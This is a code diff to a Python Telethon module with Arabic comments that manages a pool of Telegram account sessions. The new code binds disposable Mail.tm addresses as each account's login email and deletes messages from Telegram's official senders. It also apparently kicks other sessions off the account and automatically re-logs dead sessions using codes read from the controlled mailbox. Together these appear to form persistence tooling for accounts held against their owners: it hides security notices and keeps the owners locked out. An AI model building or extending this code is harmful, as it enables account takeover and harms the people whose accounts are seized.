@@ -23,6 +23,7 @@ from telethon.tl.functions.account import (
     UpdateProfileRequest,
     SendVerifyEmailCodeRequest,
     VerifyEmailRequest,
+    GetPasswordRequest,
 )
 from telethon.tl.types import (
     EmailVerifyPurposeLoginSetup,
@@ -47,6 +48,7 @@ pending_clients: dict = {}
 _recovery_tasks: dict[str, asyncio.Task] = {}
 _auto_kick_tasks: dict[str, asyncio.Task] = {}
 _recovery_scheduled: set[str] = set()
+_recovery_on_done = None
 
 OFFICIAL_SENDERS = (777000, 42777)
 CODE_PATTERN = re.compile(r"\b\d{5}\b")
@@ -69,6 +71,36 @@ async def delete_telegram_official_messages(client) -> None:
 def _is_email_not_allowed(err: Exception) -> bool:
     s = str(err).upper()
     return "EMAIL_NOT_ALLOWED" in s
+
+
+def _is_email_not_setup(err: Exception) -> bool:
+    return "EMAIL_NOT_SETUP" in str(err).upper()
+
+
+def set_recovery_callback(callback):
+    """يُستدعى من main عند نجاح/فشل إنعاش الجلسة."""
+    global _recovery_on_done
+    _recovery_on_done = callback
+
+
+async def _telegram_has_login_email(client) -> bool:
+    """هل الحساب مربوط فعلياً ببريد Login على تيليجرام؟"""
+    try:
+        pwd = await client(GetPasswordRequest())
+        return bool(getattr(pwd, "login_email_pattern", None))
+    except Exception as e:
+        logger.debug("GetPassword login_email: %s", e)
+        return False
+
+
+async def _login_setup_purpose(client, phone: str):
+    """أول ربط بريد — يتطلب phone_code_hash من send_code_request."""
+    norm = database.normalize_phone(phone)
+    sent = await client.send_code_request(norm)
+    return EmailVerifyPurposeLoginSetup(
+        phone_number=norm,
+        phone_code_hash=sent.phone_code_hash,
+    )
 
 
 # ──────────────────────────────────────────
@@ -105,7 +137,7 @@ async def post_registration_setup(
     """
     await delete_telegram_official_messages(client)
     row = await database.get_session_by_phone(phone)
-    kept = await existing_login_email_ok(row)
+    kept = await existing_login_email_ok(row, client)
     if kept:
         email_res = {
             "success": True,
@@ -120,6 +152,8 @@ async def post_registration_setup(
     await delete_telegram_official_messages(client)
     await database.set_auto_kick_stage(phone, 0)
     schedule_auto_kick_pipeline(phone)
+    if not email_res.get("success") and not email_res.get("skipped"):
+        schedule_login_email_bind_retry(phone)
     return email_res
 
 
@@ -296,22 +330,36 @@ async def check_session_valid(phone: str) -> bool:
     return await check_session_alive(phone)
 
 
-async def bulk_check_sessions() -> dict:
-    """فحص كل الجلسات النشطة وتصنيف الميتة/المجمدة كغير صالحة."""
+async def bulk_check_sessions(recover_via_email: bool = True) -> dict:
+    """فحص الجلسات — الميتة تُجدول للإنعاش إن وُجد بريد Login."""
     sessions = await database.get_all_sessions()
-    checked = invalid = 0
+    checked = invalid = recovery_scheduled = 0
     dead_phones = []
     for s in sessions:
         if not s["valid"]:
             continue
         phone = s["phone"]
         checked += 1
-        if not await check_session_alive(phone):
+        if await check_session_alive(phone):
+            await asyncio.sleep(0.3)
+            continue
+        dead_phones.append(phone)
+        login_email = database.row_login_email(s)
+        has_mail = bool(login_email and s["email_password"])
+        if recover_via_email and has_mail:
+            _recovery_scheduled.discard(phone)
+            schedule_standard_recovery(phone)
+            recovery_scheduled += 1
+        else:
             await database.mark_session_invalid(phone)
             invalid += 1
-            dead_phones.append(phone)
         await asyncio.sleep(0.3)
-    return {"checked": checked, "invalid": invalid, "phones": dead_phones}
+    return {
+        "checked": checked,
+        "invalid": invalid,
+        "recovery_scheduled": recovery_scheduled,
+        "phones": dead_phones,
+    }
 
 
 # ──────────────────────────────────────────
@@ -406,10 +454,9 @@ async def fetch_code_from_email(
     return await mailtm.fetch_code(address, password, attempts, interval)
 
 
-async def existing_login_email_ok(row) -> str | None:
+async def existing_login_email_ok(row, client=None) -> str | None:
     """
-    بريد Login محفوظ وصندوق Mail.tm يعمل — لا نستبدله.
-    يعيد عنوان البريد أو None إن لزم الربط من جديد.
+    بريد Login محفوظ + Mail.tm يعمل + (إن وُجد client) مربوط على تيليجرام.
     """
     if not row:
         return None
@@ -421,32 +468,53 @@ async def existing_login_email_ok(row) -> str | None:
         return None
     try:
         await mailtm.get_token(email, pwd)
-        return email
     except Exception as e:
         logger.debug("login email mailbox check %s: %s", email, e)
         return None
+    if client and not await _telegram_has_login_email(client):
+        logger.info(
+            "mail.tm OK but Telegram login email missing for %s",
+            database.row_get(row, "phone", "?"),
+        )
+        return None
+    return email
 
 
 async def _email_verify_purpose(client, phone: str, phone_code_hash: str | None = None):
     """
-    جلسة مسجّلة: LoginChange (بدون hash).
-    أثناء تسجيل الدخول قبل اكتماله: LoginSetup + phone_code_hash.
+    LoginSetup: أول ربط (أثناء التسجيل أو حساب بلا بريد على تيليجرام).
+    LoginChange: تغيير بريد موجود فعلاً على الحساب.
     """
-    if await client.is_user_authorized():
-        return EmailVerifyPurposeLoginChange()
     if phone_code_hash:
         return EmailVerifyPurposeLoginSetup(
             phone_number=database.normalize_phone(phone),
             phone_code_hash=phone_code_hash,
         )
+    if await client.is_user_authorized():
+        if await _telegram_has_login_email(client):
+            return EmailVerifyPurposeLoginChange()
+        return await _login_setup_purpose(client, phone)
     return EmailVerifyPurposeLoginChange()
+
+
+async def _send_verify_email_code(client, phone: str, email: str, phone_code_hash=None):
+    """إرسال كود التحقق — مع إعادة المحاولة بـ LoginSetup عند EMAIL_NOT_SETUP."""
+    purpose = await _email_verify_purpose(client, phone, phone_code_hash)
+    try:
+        await client(SendVerifyEmailCodeRequest(purpose=purpose, email=email))
+        return purpose
+    except Exception as e:
+        if not _is_email_not_setup(e):
+            raise
+        purpose = await _login_setup_purpose(client, phone)
+        await client(SendVerifyEmailCodeRequest(purpose=purpose, email=email))
+        return purpose
 
 
 async def _bind_login_email(
     client, phone: str, phone_code_hash: str | None = None
 ) -> dict:
     last_error = "جميع النطاقات مرفوضة من تيليجرام"
-    purpose = await _email_verify_purpose(client, phone, phone_code_hash)
     try:
         domains = await mailtm.get_active_domains()
         for domain in domains:
@@ -454,8 +522,8 @@ async def _bind_login_email(
             new_email = account["address"]
             email_password = account["password"]
             try:
-                await client(
-                    SendVerifyEmailCodeRequest(purpose=purpose, email=new_email)
+                purpose = await _send_verify_email_code(
+                    client, phone, new_email, phone_code_hash
                 )
             except Exception as e:
                 if _is_email_not_allowed(e):
@@ -490,19 +558,19 @@ async def _bind_login_email(
 
 async def change_login_email(phone: str, force: bool = False) -> dict:
     row = await database.get_session_by_phone(phone)
+    client = await get_active_client(phone)
+    if not client:
+        return {"success": False, "error": "الجلسة معطلة"}
     if not force:
-        kept = await existing_login_email_ok(row)
+        kept = await existing_login_email_ok(row, client)
         if kept:
+            await client.disconnect()
             return {
                 "success": True,
                 "email": kept,
                 "skipped": True,
                 "message": "بريد Login الحالي يعمل — لم يُغيَّر",
             }
-
-    client = await get_active_client(phone)
-    if not client:
-        return {"success": False, "error": "الجلسة معطلة"}
     try:
         res = await _bind_login_email(client, phone)
         await delete_telegram_official_messages(client)
@@ -555,6 +623,7 @@ async def _auto_kick_worker(phone: str):
             if result.get("success"):
                 await database.mark_auto_kick_done(phone)
                 logger.info("auto kick OK %s attempt %s", phone, attempt)
+                asyncio.create_task(_post_kick_session_watch(phone))
                 return
             logger.info(
                 "auto kick fail %s attempt %s: %s",
@@ -619,6 +688,37 @@ async def admin_full_cleanup(phone: str, new_password: str) -> dict:
 # ──────────────────────────────────────────
 # إنعاش جلسة منتهية عبر بريد Login
 # ──────────────────────────────────────────
+def _normalize_login_code(raw: str | None) -> str | None:
+    if not raw:
+        return None
+    match = CODE_PATTERN.search(str(raw))
+    if not match:
+        return None
+    digits = match.group(0)
+    return digits[:5] if len(digits) >= 5 else digits
+
+
+async def _request_login_code_via_email(client, phone: str):
+    """طلب كود دخول — يُفضّل إرساله إلى بريد Login المربوط."""
+    norm = database.normalize_phone(phone)
+    sent = await client.send_code_request(norm)
+    phone_code_hash = sent.phone_code_hash
+    if "Email" in type(sent.type).__name__:
+        return phone_code_hash
+    for _ in range(3):
+        try:
+            sent = await client(
+                ResendCodeRequest(norm, phone_code_hash)
+            )
+            phone_code_hash = sent.phone_code_hash
+            if "Email" in type(sent.type).__name__:
+                return phone_code_hash
+        except Exception as e:
+            logger.debug("resend login code %s: %s", phone, e)
+        await asyncio.sleep(2)
+    return phone_code_hash
+
+
 async def recover_session(phone: str) -> dict:
     row = await database.get_session_by_phone(phone)
     if not row:
@@ -630,21 +730,20 @@ async def recover_session(phone: str) -> dict:
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     await client.connect()
     try:
-        sent = await client.send_code_request(phone)
-        phone_code_hash = sent.phone_code_hash
+        phone_code_hash = await _request_login_code_via_email(client, phone)
 
-        if "Email" not in type(sent.type).__name__:
-            try:
-                sent = await client(ResendCodeRequest(phone, phone_code_hash))
-                phone_code_hash = sent.phone_code_hash
-            except Exception as e:
-                logger.debug("resend code %s: %s", phone, e)
-
-        code = await fetch_code_from_email(
+        raw_code = await fetch_code_from_email(
             login_email, row["email_password"], attempts=24, interval=5
         )
+        code = _normalize_login_code(raw_code)
         if not code:
-            return {"success": False, "error": "لم يصل كود الدخول لبريد Login"}
+            return {
+                "success": False,
+                "error": (
+                    "لم يصل كود الدخول لبريد Mail.tm المحفوظ — "
+                    "ربما غُيّر بريد Login على الحساب"
+                ),
+            }
 
         try:
             await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
@@ -662,13 +761,112 @@ async def recover_session(phone: str) -> dict:
         )
         _recovery_scheduled.discard(phone)
         return {"success": True, "email": login_email}
+    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
+        return {
+            "success": False,
+            "error": "كود الدخول من البريد غير صالح أو منتهي",
+        }
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        err = str(e)
+        if "EMAIL" in err.upper() or "CODE" in err.upper():
+            return {
+                "success": False,
+                "error": f"فشل الإنعاش عبر البريد: {err}",
+            }
+        return {"success": False, "error": err}
     finally:
         await client.disconnect()
 
 
+_email_bind_retry_tasks: dict[str, asyncio.Task] = {}
+
+
+def schedule_login_email_bind_retry(phone: str):
+    """إعادة محاولة ربط بريد Login بعد التسجيل إن فشل أول مرة."""
+    if phone in _email_bind_retry_tasks and not _email_bind_retry_tasks[phone].done():
+        return
+
+    async def _worker():
+        try:
+            await asyncio.sleep(45)
+            for attempt in range(3):
+                row = await database.get_session_by_phone(phone)
+                client = await get_active_client(phone)
+                if not client:
+                    return
+                if await existing_login_email_ok(row, client):
+                    await client.disconnect()
+                    return
+                res = await _bind_login_email(client, phone)
+                await client.disconnect()
+                if res.get("success"):
+                    logger.info("login email bound on retry %s attempt %s", phone, attempt)
+                    return
+                await asyncio.sleep(60 * (attempt + 1))
+        except Exception as e:
+            logger.error("email bind retry %s: %s", phone, e)
+        finally:
+            _email_bind_retry_tasks.pop(phone, None)
+
+    _email_bind_retry_tasks[phone] = asyncio.create_task(_worker())
+
+
+def schedule_standard_recovery(phone: str, on_done=None):
+    """إنعاش تلقائي: انتظار SESSION_RECOVERY_DELAY ثم كود من Mail.tm."""
+    from config import SESSION_RECOVERY_DELAY
+
+    schedule_session_recovery(
+        phone, SESSION_RECOVERY_DELAY, on_done=on_done or _recovery_on_done
+    )
+
+
+async def _post_kick_session_watch(phone: str):
+    """بعد الطرد: إن ماتت الجلسة — انتظار 5 دقائق ثم إنعاش عبر البريد."""
+    await asyncio.sleep(60)
+    if await check_session_alive(phone):
+        return
+    row = await database.get_session_by_phone(phone)
+    if not row or not database.row_login_email(row) or not row["email_password"]:
+        return
+    if phone in _recovery_scheduled:
+        return
+    logger.info("session dead after kick, scheduling standard recovery %s", phone)
+    schedule_standard_recovery(phone)
+
+
+async def startup_recover_dead_sessions(on_done=None) -> dict:
+    """
+    عند تشغيل السيرفر: فحص كل الجلسات ذات بريد Login وإنعاش الميتة.
+    """
+    global _recovery_scheduled
+    _recovery_scheduled.clear()
+    sessions = await database.get_all_sessions()
+    scheduled = revived_in_db = dead = 0
+    for s in sessions:
+        phone = s["phone"]
+        if not database.row_login_email(s) or not s["email_password"]:
+            continue
+        alive = await check_session_alive(phone)
+        if alive:
+            if not s["valid"]:
+                await database.mark_session_valid(phone)
+                revived_in_db += 1
+            continue
+        dead += 1
+        schedule_standard_recovery(phone, on_done=on_done)
+        scheduled += 1
+        await asyncio.sleep(0.5)
+    logger.info(
+        "startup recovery: dead=%s scheduled=%s revived_valid_flag=%s",
+        dead,
+        scheduled,
+        revived_in_db,
+    )
+    return {"dead": dead, "scheduled": scheduled, "revived_in_db": revived_in_db}
+
+
 def schedule_session_recovery(phone: str, delay: int, on_done=None):
+    on_done = on_done or _recovery_on_done
     if phone in _recovery_tasks and not _recovery_tasks[phone].done():
         return
     if phone in _recovery_scheduled:
@@ -689,6 +887,7 @@ def schedule_session_recovery(phone: str, delay: int, on_done=None):
                 await on_done(phone, {"success": False, "error": str(e)})
         finally:
             _recovery_tasks.pop(phone, None)
+            _recovery_scheduled.discard(phone)
 
     _recovery_tasks[phone] = asyncio.create_task(_run())
 
